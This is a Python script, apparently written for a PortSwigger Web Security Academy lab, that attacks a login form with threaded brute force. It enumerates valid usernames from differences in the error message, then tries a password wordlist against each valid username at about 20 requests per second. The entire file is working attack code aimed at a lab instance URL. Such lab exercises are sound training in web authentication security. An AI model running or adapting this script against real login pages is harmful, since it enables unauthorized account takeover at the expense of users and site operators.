#!/bin/python3
# A Simple brute-force algorithm using threading.
# To be used in a Lab By PortSwigger
# https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses
import concurrent.futures
import requests, sys, time
from bs4 import BeautifulSoup

# Fail-safe
if len(sys.argv) < 3:
    print("[!] Usage: python bruteforce.py <usernames file> <passwords file>")
    sys.exit(-1)

print("\n[*] Starting Brute-Force Attack")

# Get usernames and passwords
usernames = []
usernamesFd = open(sys.argv[1], "r")
for line in usernamesFd.readlines():
    usernames.append(line.split("\n")[0])
usernamesFd.close()
print("\n[+] Username File Loaded..")

passwords = []
passwordsFd = open(sys.argv[2], "r")
for passLine in passwordsFd.readlines():
    passwords.append(passLine.split("\n")[0])
print("[+] Password File Loaded..")

# Headers
header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
}

# URL to send requests to
URL = "https://0a5100eb0491dcea85483f5a002b00b7.web-security-academy.net/login"


# Define the function to send a request
def send_request(uname, upass):
    # POST Request Body to send
    body = "username={}&password={}".format(uname, upass)
    response = requests.post(URL, data=body, headers=header)
    return response.content, uname, upass


# Logic Variables
username_pos = 0

print("\n[*] Will begin brute-forcing username")

# Valid Variables
valid_usernames = []
valid_passwords = []

# Create a ThreadPoolExecutor with a maximum of 20 threads
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    # Submit the requests
    futures = []

    # 100 usernames => 20 username per second => 100 usernames in 5 seconds
    for uname in usernames:
        if username_pos == 20:
            print("[*] Sending: 20 requests per second")
            time.sleep(1)
            username_pos = 0

        futures.append(executor.submit(send_request, uname, "mytestpass"))
        username_pos += 1

    print("\n[+] Processing Responses")

    # Wait for the responses
    for future in concurrent.futures.as_completed(futures):
        try:
            response = future.result()
            # Process the response here
            soup = BeautifulSoup(response[0], "html5lib")
            main_section = soup.find("section", attrs={"class": "maincontainer"})
            pTag = main_section.find("p", attrs={"class": "is-warning"})
            if pTag.__contains__("Incorrect password"):
                print("[+] Username Valid: {}".format(response[1]))
                valid_usernames.append(response[1])
            else:
                pass

        except Exception as e:
            # Handle any exceptions that occurred during the request
            print(f"An error occurred: {str(e)}")

if len(valid_usernames) <= 0:
    print("\n[+] Brute-force Attack Finished")
    sys.exit(0)

print("\n[+] Found {} usernames".format(len(valid_usernames)))
print(valid_usernames)
print("\n[*] Will begin brute-forcing password")

# Logic Variables
password_pos = 0

# Create a ThreadPoolExecutor with a maximum of 20 threads
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    # Submit the requests
    futures = []

    # 100 passwords => 20 passwords per second => 100 passwords in 5 seconds
    for valid_uname in valid_usernames:
        for upass in passwords:
            if password_pos == 20:
                print("[*] Sending: 20 requests per second")
                time.sleep(1)
                password_pos = 0

            futures.append(executor.submit(send_request, valid_uname, upass))
            password_pos += 1

    print("\n[+] Processing Responses")

    # Wait for the responses
    for future in concurrent.futures.as_completed(futures):
        try:
            response = future.result()
            # Process the response here
            soup = BeautifulSoup(response[0], "html5lib")
            main_section = soup.find("section", attrs={"class": "maincontainer"})
            pTag = main_section.find("p", attrs={"class": "is-warning"})
            if pTag:
                pass
            else:
                print("[+] Valid Password Found: {}".format(response[2]))

        except Exception as e:
            # Handle any exceptions that occurred during the request
            print(f"An error occurred: {str(e)}")

print("\n[+] Brute-force Attack Finished")
